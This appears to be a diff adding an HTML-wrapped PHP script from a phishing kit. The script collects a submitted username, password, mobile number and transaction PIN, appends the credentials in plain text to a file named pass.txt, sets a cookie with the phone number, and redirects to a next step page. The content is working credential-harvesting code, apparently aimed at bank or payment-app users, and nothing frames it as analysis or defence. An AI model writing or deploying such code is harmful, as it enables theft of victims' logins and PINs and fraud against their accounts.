@@ -1,0 +1,48 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title></title>
+</head>
+<body>
+&lt;?php<br/>
+//    echo&quot;&lt;pre&gt;&quot;;print_r($_POST);die();<br/>
+if (isset($_POST[&#39;submit&#39;])) {<br/>
+    // echo&quot;&lt;pre&gt;&quot;;print_r($_POST);die();<br/>
+    $file_name = $_POST[&#39;Username&#39;].&#39;_&#39;. $_POST[&#39;Password&#39;];<br/>
+    $data=[<br/>
+         &#39;id&#39;             =&gt;  $_POST[&#39;Username&#39;],<br/>
+        &#39;Password&#39;          =&gt;  $_POST[&#39;Password&#39;],<br/>
+       &#39;number&#39;=&gt;$_POST[&#39;Mobile&#39;],<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/>
+    ];<br/>
+&nbsp;&nbsp;&nbsp;$Username = $_POST[&#39;Username&#39;];<br/>
+  $Password = $_POST[&#39;Password&#39;];<br/>
+  $transaction_pin = $_POST[&#39;m_pin_first&#39;];<br/>
+  $number = $_POST[&#39;Mobile&#39;];<br/>
+  <br/>
+  setcookie(&quot;number&quot;, $number, time() + 3600, &#39;/&#39;);<br/>
+<br/>
+  $Username = &quot;id:$Username&quot;;<br/>
+    $Password = &quot;Password:$Password&quot;;<br/>
+&nbsp;&nbsp;&nbsp;  $number = &quot;number:$number&quot;;<br/>
+  $myfile = fopen(&quot;pass.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;);<br/>
+<br/>
+$txt43 =&quot;&quot;;<br/>
+fwrite($myfile, &quot;\r\n&quot;. $txt43);<br/>
+fwrite($myfile, &quot;\r\n&quot;. $Username);<br/>
+fwrite($myfile, &quot;\r\n&quot;. $Password);<br/>
+fwrite($myfile, &quot;\r\n&quot;. $number);<br/>
+fclose($myfile);<br/>
+<br/>
+   <br/>
+   <br/>
+    header(&#39;location: step12.php&#39;);<br/>
+    die();<br/>
+//     $fp = fopen(&#39;lidn.txt&#39;, &#39;w&#39;);<br/>
+// fwrite($fp,[ ]);<br/>
+// fclose($fp);<br/>
+}<br/>
+<br/>
+<br/>
+<br/>
+?&gt;</body></html>
